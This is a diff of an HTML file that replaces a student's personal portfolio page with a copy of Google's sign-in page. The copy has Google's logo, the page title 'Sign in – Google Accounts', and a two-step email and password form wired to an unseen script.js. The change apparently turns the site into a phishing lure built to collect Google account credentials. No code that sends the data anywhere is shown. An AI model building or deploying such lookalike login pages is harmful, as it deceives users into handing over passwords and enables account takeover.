@@ -3,22 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jonathan | Student & Pilot</title>
+    <title>Sign in – Google Accounts</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <header>
-        <nav>
-            <div class="logo">JONATHAN<span>.dev</span></div>
-        </nav>
-    </header>
-    <main class="hero">
-        <h1 class="animate-text">Endurance. Analysis. Flight.</h1>
-        <div class="card-grid">
-            <div class="card"><h3>Drone Logs</h3><p>Advanced flight data.</p></div>
-            <div class="card"><h3>Stock Watch</h3><p>Momentum under $10.</p></div>
-            <div class="card"><h3>Academics</h3><p>Algebra & Reading.</p></div>
+    <div class="login-box">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" width="75">
         </div>
-    </main>
+        
+        <div id="view-container">
+            <!-- View 1: Email -->
+            <div id="email-view" class="view active">
+                <h1>Sign in</h1>
+                <p>Use your Google Account</p>
+                <div class="input-group">
+                    <input type="email" id="email" required>
+                    <label>Email or phone</label>
+                </div>
+                <div class="actions">
+                    <a href="#">Forgot email?</a>
+                    <button id="next-btn" class="blue-btn">Next</button>
+                </div>
+            </div>
+
+            <!-- View 2: Password (Hidden initially) -->
+            <div id="password-view" class="view">
+                <h1>Welcome</h1>
+                <p id="display-email" style="border: 1px solid #dadce0; border-radius: 20px; padding: 5px 10px; display: inline-block;"></p>
+                <div class="input-group">
+                    <input type="password" id="password" required>
+                    <label>Enter your password</label>
+                </div>
+                <div class="actions">
+                    <a href="#">Forgot password?</a>
+                    <button id="login-btn" class="blue-btn">Next</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
